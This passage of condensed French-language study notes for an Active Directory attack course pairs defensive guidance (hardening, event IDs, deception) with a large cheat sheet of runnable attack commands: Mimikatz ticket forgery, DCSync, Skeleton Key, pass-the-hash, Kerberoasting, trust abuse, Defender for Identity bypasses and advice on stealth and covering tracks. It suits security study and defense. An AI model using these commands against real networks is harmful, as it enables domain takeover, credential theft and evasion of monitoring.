Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

**msDS-ShadowPrincipalSid**: Contient SID du groupe dans production forest (ex: DA, EA)

### Attack PAM Trust

**Scenario**: Compromission bastion forest → escalade vers production forest

```powershell
# 1. Depuis production forest (techcorp.local) - Vérifier trust vers bastion
Get-ADTrust -Filter *

# 2. Enumérer FSPs dans bastion
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local

# 3. Si admin access bastion → PSRemoting
$bastiondc = New-PSSession bastion-dc.bastion.local
Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}} -Session $bastiondc

# 4. Vérifier Shadow Principals et leurs mappings
Invoke-Command -ScriptBlock {
    Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
} -Session $bastiondc

# 5. Si membre Shadow Principal = production DA/EA → Accès direct production
Enter-PSSession 192.168.102.1 -Authentication NegotiateWithImplicitCredential

# Accès production forest avec high privileges
ls \\production-dc.production.local\C$
```

⚠️ **Explication Attack Flow**:
1. Compromission bastion forest (ex: via phishing, vuln, etc.)
2. User compromis = membre Shadow Principal dans bastion
3. Shadow Principal mapped à DA/EA SID dans production forest
4. Authentification production = recognition automatic des high privs via PAM trust
5. Instant access production en tant que DA/EA

**Détection:**
- Monitor création/modification Shadow Principals
- Alert sur usage NegotiateWithImplicitCredential authentication
- Anomaly detection: Accès production depuis bastion principals

---

## 🛡️ PHASE 11: DETECTION & DEFENSE

### Protected Users Group

**Protections (Server 2012 R2+):**

**Device Protections** (sur workstation où user logon):
- **Pas CredSSP/WDigest**: No cleartext credentials caching
- **NTLM hash not cached**: Empêche credential theft from LSASS
- **Kerberos**: Pas DES/RC4 keys, pas caching cleartext/long-term keys

**DC Protections** (si Domain Functional Level ≥ Server 2012 R2):
- **Pas NTLM authentication**: Force Kerberos only
- **Pas DES/RC4** dans Kerberos pre-auth (AES seulement)
- **Pas delegation** (constrained ou unconstrained)
- **TGT lifetime**: Max 4h, non-renewable (hardcoded)

**Limitations:**
- Requiert DFL Server 2012 R2+, tous DCs Server 2008+ (pour AES)
- **Pas offline sign-on** (no cached logon)
- **Computer/Service accounts**: Inutile (credentials toujours sur host)
- Microsoft recommande **tester impact** avant d'ajouter DAs/EAs
- Risque lockout si mal configuré

**Ajouter users:**
```powershell
Add-ADGroupMember -Identity "Protected Users" -Members Administrator
```

### Privileged Administrative Workstations (PAWs)

**Concept**: Workstation durcie exclusivement pour tâches admin sensibles

**Stratégies:**
- **Separate hardware**: Admin tasks = PAW uniquement, user tasks = autre PC
- **VM on PAW**: User tasks dans VM, admin tasks sur host PAW
- **Jump Server access**: Admins accès servers seulement depuis PAW

**Protections:**
- Phishing resistance
- Credential replay attacks mitigation
- OS vulnerability isolation

**Configuration:**
- Application whitelisting strict
- Pas internet browsing
- Logging/monitoring renforcé
- MFA enforcement

### LAPS (Local Administrator Password Solution)

**Fonctionnement:**
- Passwords local admin stockés dans AD (`ms-mcs-AdmPwd` attribute)
- Rotation automatique périodique (`ms-mcs-AdmPwdExpirationTime`)
- ACL contrôlent qui peut lire passwords
- Storage: **cleartext** dans AD, transmission encrypted

**Enumération qui peut lire:**
```powershell
# PowerView - Permissions lecture LAPS
Get-DomainObjectAcl -SearchBase "LDAP://OU=Servers,DC=domain,DC=local" -ResolveGUIDs | ?{($_.ObjectAceType -like "ms-Mcs-AdmPwd") -and ($_.ActiveDirectoryRights -match "ReadProperty")} | %{ConvertFrom-SID $_.SecurityIdentifier}
```

**Mitigation abuse:**
- Limiter strictly qui peut lire `ms-mcs-AdmPwd`
- Monitor lecture attribute (Event 4662)
- Rotation fréquente passwords

### Just-In-Time (JIT) Administration

**Temporary Group Membership** (Requires Privileged Access Management Feature):
```powershell
# Ajouter DA temporairement (60 minutes)
Add-ADGroupMember -Identity 'Domain Admins' -Members tempuser -MemberTimeToLive (New-TimeSpan -Minutes 60)

# Vérifier
Get-ADGroupMember -Identity 'Domain Admins' | select Name, memberTimeToLive
```

⚠️ **Limitation**: PAM Feature **cannot be disabled** après activation

### Just Enough Administration (JEA)

**Concept**: Role-based access control pour PowerShell remoting

**Fonctionnalités:**
- Non-admins peuvent exécuter commandes admin spécifiques remotely
- Restriction commandes ET paramètres
- Transcription/logging enabled par défaut

**Configuration example:**
```powershell
# Session Configuration File (.pssc)
@{
    SessionType = 'RestrictedRemoteServer'
    RunAsVirtualAccount = $true
    RoleDefinitions = @{
        'DOMAIN\HelpDesk' = @{ RoleCapabilities = 'Maintenance' }
    }
}

# Role Capability File (.psrc) - defines allowed commands
@{
    VisibleCmdlets = @(
        'Restart-Service',
        @{ Name = 'Get-Service'; Parameters = @{ Name = 'Name' }}
    )
}
```

### Administrative Tier Model

**3 Tiers:**

**Tier 0** - Enterprise Control:
- Domain Controllers
- Domain/Enterprise Admins
- Certificate Authorities
- ADFS servers
- Critical security groups

**Tier 1** - Server Management:
- Application servers
- Server administrators
- Business-critical services

**Tier 2** - Workstation/User Management:
- User workstations
- Help Desk admins
- End-user support

**Control Restrictions**: Admins contrôlent seulement leur tier et inférieurs  
**Logon Restrictions**: Admins peuvent logon seulement sur leur tier

⚠️ **Règle clé**: **Tier 0 admins JAMAIS login sur Tier 1/2** → empêche credential theft

### ESAE (Enhanced Security Admin Environment) / Red Forest

**Concept**: 
- **Administrative Forest** dédié gestion assets critiques
- **Forest = security boundary** (pas domain)
- Production forest users = standard users dans admin forest
- Selective Authentication vers Red Forest

**Architecture:**
```
Red Forest (bastion.local)
   ↓ PAM Trust
Production Forest (production.local)
```

**Avantages:**
- Isolation complète admin credentials
- Compromission production ≠ compromission admin forest
- Selective Authentication = strict logon controls

**Challenges:**
- Complexité management
- Coût (infrastructure additionnelle)
- Requires high operational maturity

### Credential Guard

**Concept**: Virtualization-based security isolant secrets

**Protections:**
- **Effective contre**:
  - Pass-The-Hash (PTH)
  - Over-Pass-The-Hash (OPTH)
  - PTT (impossible écrire tickets mémoire même avec creds)

- **PAS protégé**:
  - Local accounts SAM
  - LSA Secrets (service accounts)

**Limitations:**
- **Cannot enable sur DC** (breaks authentication)
- Windows 10 Enterprise / Server 2016+ only
- **Mimikatz peut bypass** (mais recommandé quand même)

**Activation:**
```powershell
# Group Policy
Computer Configuration > Administrative Templates > System > Device Guard
> Turn On Virtualization Based Security
```

### Device Guard / WDAC (Windows Defender Application Control)

**Components:**
- **Configurable Code Integrity (CCI)**: Trusted code only
- **VSM Protected Code Integrity**: Enforce CCI en Kernel (KMCI) + User Mode (UMCI)
- **Platform/UEFI Secure Boot**: Boot binaries integrity

**UMCI Impact**: Bloque la plupart lateral movement attacks

**Bypasses:** LOLBAS Project (Living Off The Land Binaries And Scripts)
- Signed MS binaries: `csc.exe`, `MSBuild.exe`, `InstallUtil.exe`
- https://lolbas-project.github.io/

### Microsoft Defender for Identity (MDI)

**Capabilities:**
- **Recon detection**: Enumeration patterns
- **Compromised credentials**: Brute-force, Kerberoasting, AS-REP Roasting
- **Lateral movement**: PTH, OPTH, OPTH
- **Domain dominance**: DCSync, Golden Ticket, Skeleton Key
- **Exfiltration**: Anomalous data transfers

**Architecture:**
- Sensors sur DCs + Federation servers
- Analysis/Alerting in Azure Cloud

**Bypass Techniques:**

**1. DCSync Bypass:**
```powershell
# Utiliser whitelisted account (ex: PHS sync account)
# OU NTLM hash DC pour netsync
Invoke-Mimikatz -Command '"lsadump::netsync /dc:dc.domain.local /user:dc$ /ntlm:<dc_hash> /account:target$"'
```

**2. Golden Ticket with DC SID History:**
```powershell
# SID History = Domain Controllers + Enterprise Domain Controllers
Invoke-Mimikatz -Command '"kerberos::golden /user:dc$ /domain:domain.local /sid:<domain_SID> /groups:516 /krbtgt:<krbtgt_hash> /sids:S-1-5-21-<parent_SID>-516,S-1-5-9 /ptt"'

# S-1-5-9 = Enterprise Domain Controllers
# 516 = Domain Controllers
```

**3. Traffic normalization**: Eviter patterns suspects
- Limiter requêtes DC
- Utiliser legitimate tools (AD Module vs PowerView)
- Timing attacks (slow enumeration)

---

## 📊 DETECTION - EVENT IDS

### Golden Ticket
- **4624**: Account Logon
- **4672**: Admin Logon (Special privileges assigned)
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```

⚠️ **Indicators**:
- Account logon sans corresponding 4768 (TGT request)
- Ticket lifetime anomalies
- Source workstation ≠ DC pour TGT

### Silver Ticket
- **4624**: Account Logon
- **4634**: Account Logoff  
- **4672**: Admin Logon

⚠️ **Indicators**:
- Service access sans corresponding TGS request (4769)
- Account name anomalies

### Skeleton Key
- **System 7045**: Service installation (Type: Kernel Mode Driver)
- **Security 4673**: Sensitive Privilege Use (requires "Audit privilege use")
- **4611**: Trusted logon process registered with LSA

```powershell
# Detection
Get-WinEvent -FilterHashtable @{Logname='System';ID=7045} | ?{$_.message -like "*Kernel Mode Driver*"}

# Mitigation - RunAsPPL
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose
# Verify après reboot
Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}
```

### DSRM Abuse
- **4657**: Registry value modified
  - `HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior`

### Malicious SSP
- **4657**: Registry value modified
  - `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

### Kerberoast
- **4769**: Kerberos ticket requested (TGS)

**Filtres détection:**
- Service name ≠ `krbtgt`
- Service name sans `$` (filter machine accounts)
- Account name ≠ `machine@domain`
- Failure code = `0x0` (success)
- **Ticket encryption = 0x17** (RC4-HMAC = downgrade suspect)

**Mitigation:**
- Service account passwords >30 chars
- **gMSA (Group Managed Service Accounts)**: Auto password rotation
- Monitor 4769 avec filters ci-dessus

### Unconstrained Delegation
**Mitigation:**
- Limiter DA/Admin logons vers serveurs spécifiques
- Set "Account is sensitive and cannot be delegated" pour privileged accounts

```powershell
# Set attribute
Set-ADAccountControl -Identity Administrator -AccountNotDelegated $true
```

### ACL Attacks
- **4662**: Operation performed on object (Audit Policy object required)
- **5136**: Directory Service object modified
- **4670**: Permissions on object changed

**Tool**: AD ACL Scanner - https://github.com/canix1/ADACLScanner

### Trust Tickets / SID Filtering

**SID Filtering:**
- **Enabled** par défaut inter-forest trusts
- **Disabled** intra-forest (MS considers forest = security boundary)
- Souvent disabled car peut break applications

**Selective Authentication:**
- Requiert explicit access accordé pour chaque server/domain
- Users pas automatically authenticated cross-trust
- Complexe à gérer → rarement utilisé

---

## 🎣 DECEPTION

### Deception Philosophy

**Concept**: Utiliser decoy objects pour:
- Détecter adversaries
- Augmenter coût attaque (temps)
- Forcer adversaries vers attack paths monitorés

**Cibles Deception:**
- Mindset adversary: "lowest hanging fruit"
- Illusive superiority sur défenseurs

**What to Decoy:**
- Users avec high privileges (fake DA)
- Permissions anormales sur objects
- ACLs mal configurées
- Attributs users dangereux

### Deploy-Deception Tool

https://github.com/samratashok/Deploy-Deception

**Prerequisite:** Enable DS Access logging
```
Windows Settings > Security Settings > Advanced Audit Policy Configuration > DS Access > Audit Directory Service Access
```

### User Deception

**Decoy User - Password Never Expires:**
```powershell
Create-DecoyUser -UserFirstName user -UserLastName manager -Password Pass@123 | Deploy-UserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose
```

⚠️ **Logging**: Event **4662** logged quand `x500uniqueIdentifier` (GUID: d07da11f-8a3d-42b6-b0aa-76c962be719a) est lu

**Triggered by**: LDAP tools (PowerView, ADExplorer)  
**NOT triggered by**: `net.exe`, WMI (`Win32_UserAccount`), AD Module

### Privileged User Deception

**Fake Domain Admin:**
```powershell
Create-DecoyUser -UserFirstName dec -UserLastName da -Password Pass@123 | Deploy-PrivilegedUserDeception -Technique DomainAdminsMemebership -Protection DenyLogon -Verbose
```

**Protections:**
- User membre Domain Admins
- **Deny Logon** sur TOUTES machines (empêche usage malveillant)

**Détection:**
- **4768**: TGT request pour decoy user = tentative usage credentials
- **4662**: DACL/properties read = enumeration

### Computer Deception

Decoy computers configurés comme high-value targets:
- Unconstrained Delegation enabled
- Specific SPNs
- Dans OUs sensibles

**Detection**: Connexion vers decoy computer = alert

### Deception Best Practices

1. **Realistic decoys**: Noms/attributs crédibles
2. **Mixed with real**: Pas évident que c'est decoy
3. **Multiple layers**: Users, Computers, Groups, ACLs
4. **Monitoring**: SIEM integration pour alerts 4662, 4768
5. **Response plan**: Process quand decoy accessed

---

## 🎯 ATTACK KILL CHAIN SUMMARY

### Phase 1: Initial Access
- Phishing
- Credential stuffing
- Vulnerabilities
- Supply chain

### Phase 2: Enumeration
```powershell
# Domain info
Get-Domain, Get-DomainController, Get-DomainPolicy

# Users/Groups/Computers
Get-DomainUser, Get-DomainGroup, Get-DomainComputer

# Trusts
Get-DomainTrust, Get-ForestDomain

# ACLs
Get-DomainObjectAcl, Find-InterestingDomainAcl

# BloodHound
SharpHound.exe -c All
```

### Phase 3: Credential Access
```powershell
# LSASS dump
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'

# Kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roast
Rubeus.exe asreproast /outfile:hashes.txt
```

### Phase 4: Privilege Escalation
```powershell
# Kerberos Delegation
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth

# ACL Abuse
Add-DomainObjectAcl -Rights DCSync

# GPO Abuse
Get-DomainGPOLocalGroup
```

### Phase 5: Lateral Movement
```powershell
# Pass-The-Hash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /ntlm:<hash> /run:cmd"'

# OverPass-The-Hash
Rubeus.exe asktgt /user:Administrator /rc4:<hash> /ptt

# PSRemoting
Invoke-Command -ComputerName target -ScriptBlock {whoami}
```

### Phase 6: Domain Dominance
```powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /krbtgt:<hash> /ptt"'

# Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /target:server.domain.local /service:cifs /rc4:<hash> /ptt"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\Administrator"'
```

### Phase 7: Persistence
```powershell
# AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -Rights All

# Golden Ticket (long-term)
# /endin:600 = 10 ans

# Skeleton Key
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc

# DSRM
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
```

### Phase 8: Cross-Domain/Forest
```powershell
# Trust Ticket (Child to Parent)
Invoke-Mimikatz -Command '"kerberos::golden /domain:child.parent.local /sid:<child_SID> /sids:<parent_SID>-519 /rc4:<trust_key> /service:krbtgt /target:parent.local /ticket:trust.kirbi"'

# Cross-Forest Kerberoast
Rubeus.exe kerberoast /domain:trustedforest.local

# SQL Server Links
Get-SQLServerLinkCrawl -Instance sql.domain.local
Invoke-SQLOSCmd -Instance sql -Command "whoami" -Crawl
```

---

## 📚 COMMANDES ESSENTIELLES PAR CATÉGORIE

### Enumération Domain
```powershell
# Get current domain
Get-Domain
(Get-ADDomain).DNSRoot

# Domain SID
Get-DomainSID
(Get-ADDomain).DomainSID

# Domain Controllers
Get-DomainController
Get-ADDomainController

# Domain Policy
Get-DomainPolicy
Get-ADDefaultDomainPasswordPolicy

# Users
Get-DomainUser
Get-DomainUser -Identity administrator -Properties *
Get-ADUser -Filter * -Properties *

# Groups
Get-DomainGroup
Get-DomainGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"'

# Group Members
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# Computers
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-ADComputer -Filter *

# GPOs
Get-DomainGPO
Get-GPO -All

# OUs
Get-DomainOU
Get-ADOrganizationalUnit -Filter *

# ACLs
Get-DomainObjectAcl -Identity administrator -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs

# Trusts
Get-DomainTrust
Get-ADTrust -Filter *

# Forest
Get-Forest
Get-ForestDomain
Get-ADForest
```

### Credential Dumping
```powershell
# Mimikatz - Local
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

# SAM/LSA
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::secrets"'

# Trust Keys
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:child$"'
```

### Kerberos Attacks
```powershell
# Kerberoast
Get-DomainUser -SPN
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /user:serviceaccount /simple

# AS-REP Roast
Get-DomainUser -PreauthNotRequired
Rubeus.exe asreproast /outfile:hashes.txt

# PTH
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /ntlm:<hash> /run:cmd"'

# OverPTH
Rubeus.exe asktgt /user:Administrator /rc4:<hash> /ptt
Rubeus.exe asktgt /user:Administrator /aes256:<key> /ptt

# PTT
Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Delegation Attacks
```powershell
# Unconstrained
Get-DomainComputer -Unconstrained
Rubeus.exe monitor /interval:5 /filteruser:DC$

# Constrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
Rubeus.exe s4u /user:serviceaccount /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt

# RBCD
Set-ADComputer -Identity target -PrincipalsAllowedToDelegateToAccount AttackerPC$
Rubeus.exe s4u /user:AttackerPC$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
```

### Persistence
```powershell
# Golden Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /krbtgt:<hash> /id:500 /ptt"'

# Silver Ticket
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:domain.local /sid:<SID> /target:server.domain.local /service:cifs /rc4:<hash> /ptt"'

# Skeleton Key
Invoke-Mimikatz -Command '"misc::skeleton"' -ComputerName dc

# DSRM
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:DC01 /user:Administrator /ntlm:<dsrm_hash>"'

# AdminSDHolder
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local' -PrincipalIdentity attacker -Rights All

# DCSync Rights
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync
```

### Cross-Domain
```powershell
# Child to Parent - Trust Key
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"kerberos::golden /domain:child.parent.local /sid:<child_SID> /sids:<parent_SID>-519 /rc4:<trust_key> /service:krbtgt /target:parent.local /ticket:trust.kirbi"'
Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/parentdc.parent.local /ptt

# Child to Parent - krbtgt
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:child.parent.local /sid:<child_SID> /sids:<parent_SID>-519 /krbtgt:<krbtgt_hash> /ptt"'
```

### Cross-Forest
```powershell
# Kerberoast
Rubeus.exe kerberoast /domain:trustedforest.local

# Trust Abuse
Invoke-Mimikatz -Command '"kerberos::golden /domain:currentforest.local /sid:<current_SID> /rc4:<trust_key> /service:krbtgt /target:trustedforest.local /ticket:trust.kirbi"'

# SQL Links
Get-SQLInstanceDomain
Get-SQLServerLinkCrawl -Instance sql.domain.local
Invoke-SQLOSCmd -Instance sql -Command "whoami" -Crawl
```

---

## 🔧 OUTILS RÉFÉRENCES

### PowerShell Modules
- **PowerView**: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
- **AD Module**: https://github.com/samratashok/ADModule
- **PowerUpSQL**: https://github.com/NetSPI/PowerUpSQL
- **PowerUp**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

### C# Tools
- **Rubeus**: https://github.com/GhostPack/Rubeus
- **Certify**: https://github.com/GhostPack/Certify
- **Seatbelt**: https://github.com/GhostPack/Seatbelt
- **SharpHound**: https://github.com/BloodHoundAD/SharpHound
- **SharpView**: https://github.com/tevora-threat/SharpView

### Python Tools
- **Impacket**: https://github.com/SecureAuthCorp/impacket
  - `secretsdump.py`, `psexec.py`, `wmiexec.py`, `GetNPUsers.py`
- **BloodHound.py**: https://github.com/fox-it/BloodHound.py

### Other
- **Mimikatz**: https://github.com/gentilkiwi/mimikatz
- **BloodHound**: https://github.com/BloodHoundAD/BloodHound
- **Covenant**: https://github.com/cobbr/Covenant
- **Invoke-Obfuscation**: https://github.com/danielbohannon/Invoke-Obfuscation
- **AMSITrigger**: https://github.com/RythmStick/AMSITrigger
- **Deploy-Deception**: https://github.com/samratashok/Deploy-Deception

---

## 📖 MÉTHODOLOGIE COMPLÈTE

### Reconnaissance
1. Enumérer domain info (SID, DCs, policy)
2. Users (focus: high privs, service accounts, descriptions)
3. Groups (DA, EA, custom admin groups)
4. Computers (servers, workstations, OS versions)
5. GPOs et OUs (delegation, restricted groups)
6. ACLs (GenericAll, WriteDACL, etc.)
7. Trusts (domain, forest)
8. BloodHound collection complète

### Local Privilege Escalation
1. PowerUp / BeRoot / Privesc
2. Service misconfigurations
3. Unquoted paths
4. AlwaysInstallElevated
5. Token impersonation
6. Scheduled tasks

### Credential Access
1. LSASS dump (Mimikatz, comsvcs.dll, procdump)
2. SAM/LSA Secrets
3. Kerberoasting
4. AS-REP Roasting
5. NTDS.dit (si DA)
6. DCSync (si permissions)

### Lateral Movement
1. Pass-The-Hash
2. OverPass-The-Hash
3. Pass-The-Ticket
4. PSRemoting
5. WMI
6. DCOM

### Domain Privilege Escalation
1. Kerberos Delegation (Unconstrained, Constrained, RBCD)
2. ACL abuse
3. GPO abuse
4. OU delegation
5. Exchange PrivExchange
6. AD CS attacks (ESC1-8)

### Persistence
1. Golden Ticket
2. Silver Ticket
3. Skeleton Key
4. DSRM
5. Custom SSP
6. AdminSDHolder
7. DCSync rights via ACL

### Cross-Domain/Forest
1. Trust enumeration
2. Child to Parent (trust key / krbtgt)
3. Cross-forest Kerberoast
4. SQL Server links
5. Foreign Security Principals
6. ACL cross-forest
7. PAM trust abuse

### Covering Tracks
1. Clear event logs (détectable)
2. Disable logging (détectable)
3. Use living-off-the-land binaries
4. Minimize DC contact
5. Blend avec traffic normal

---

## 🎓 HANDS-ON LABS SUMMARY

1. **Domain Enum**: PowerView + AD Module
2. **BloodHound**: Collection + analysis
3. **Local PrivEsc**: Service abuse
4. **Kerberoast**: Crack service account
5. **Unconstrained Delegation**: Compromise + Printer Bug
6. **Constrained Delegation**: S4U attack
7. **RBCD**: Abuse GenericWrite
8. **ACL Abuse**: Reset password / DCSync rights
9. **GPO Abuse**: Local admin via Restricted Groups
10. **Golden Ticket**: Forge avec krbtgt hash
11. **Silver Ticket**: CIFS service access
12. **Skeleton Key**: Install on DC
13. **DSRM**: Logon avec local admin DC
14. **AdminSDHolder**: Persistence via ACL
15. **Child to Parent**: Trust key + krbtgt method
16. **Cross-Forest Kerberoast**: Trusted forest
17. **SQL Links**: Command exec cross-forest
18. **AD CS**: ESC1 abuse
19. **PAM Trust**: Bastion to production
20. **Deception**: Deploy decoy users

---

## ⚠️ NOTES IMPORTANTES OPÉRATIONNELLES

### OPSEC Considerations

**High Noise:**
- `Find-LocalAdminAccess` (teste TOUTES machines)
- `Invoke-ShareFinder` sans filter
- Kerberoasting en masse
- BloodHound default collection
- DCSync sans whitelist

**Medium Noise:**
- PowerView enumeration répétée
- LDAP queries volumineuses
- User hunting avec `Find-DomainUserLocation`

**Low Noise:**
- AD Module (Microsoft signed, moins suspect)
- Enumeration ciblée (specific users/groups)
- S4U attacks (ressemblent traffic légitime)

### Stealth Techniques

1. **Use AD Module** plutôt que PowerView quand possible
2. **Timing**: Slow down enumeration (avoid bursts)
3. **AES keys** plutôt que NTLM quand possible
4. **Living-off-the-land**: Binaries Windows légitimes
5. **Avoid Mimikatz direct**: Alternatives (comsvcs.dll, procdump)
6. **Minimal DC contact**: Cache local enumeration
7. **Blend traffic**: Authentications durant business hours

### Priority Targets

**High Value:**
- krbtgt hash (Golden Ticket)
- DC machine account hash (Silver Ticket + DCSync)
- Service accounts avec high privs
- Unconstrained Delegation servers
- Exchange servers
- SQL servers avec links

**Quick Wins:**
- Kerberoastable accounts
- AS-REP Roastable accounts  
- Users avec DONT_REQ_PREAUTH
- Computers avec weak ACLs
- GPOs avec RID 500 dans Restricted Groups

### Common Mistakes

1. **Pas cleanup**: Tickets, processes, files left behind
2. **Over-enumeration**: Trigger alerts excessive queries
3. **Golden Ticket abuse**: TGT requests from workstation
4. **Skeleton Key**: Crash DC si pas testé
5. **DSRM**: Oublier remettre `DsrmAdminLogonBehavior` = 0
6. **Rubeus /ptt**: Oublier que tickets expirent

---

## 🔐 DÉFENSE - QUICK REFERENCE

### Hardening Checklist

- [ ] **Protected Users**: Membres DA/EA
- [ ] **LAPS**: Déployé sur ALL workstations/servers
- [ ] **PAWs**: Admin tasks seulement
- [ ] **Tiering**: Strict enforcement logon restrictions
- [ ] **JIT/JEA**: Time-bound admin access
- [ ] **Credential Guard**: Windows 10 Ent / Server 2016+
- [ ] **WDAC**: Application whitelisting
- [ ] **MDI**: Sensors on DCs
- [ ] **Logging**: 4662, 4768, 4769, 4672 enabled + forwarded SIEM
- [ ] **Deception**: Decoy users/computers deployed

### Monitoring Priorities

**Critical Events:**
- **4768**: TGT requests (anomaly detection)
- **4769**: TGS requests (Kerberoast detection avec filters)
- **4662**: Object access (ACL modifications, AdminSDHolder)
- **4672**: Special privileges assigned (Golden/Silver Ticket)
- **5136**: Directory Service object modified
- **4657**: Registry modifications (DSRM, SSP)
- **7045**: Service installation (Skeleton Key)

### Incident Response

**Indicators of Compromise:**
1. TGT requests from workstations
2. TGS requests RC4 (0x17) pour service accounts
3. DCSync from non-DC
4. Registry modifications LSASS-related
5. Decoy object access
6. Anomalous PSRemoting
7. Golden Ticket patterns (lifetime, source)

**Response Actions:**
1. **Contain**: Isolate compromised systems
2. **Identify**: Scope of compromise (BloodHound paths)
3. **Eradicate**: 
   - Reset krbtgt (TWICE, 10h apart)
   - Reset ALL privileged accounts
   - Reset ALL service accounts
   - Rebuild compromised systems
4. **Recover**: Restore from clean backups
5. **Lessons Learned**: Update defenses

---

FIN DU CONDENSÉ - 360 PAGES COUVERTES ✅
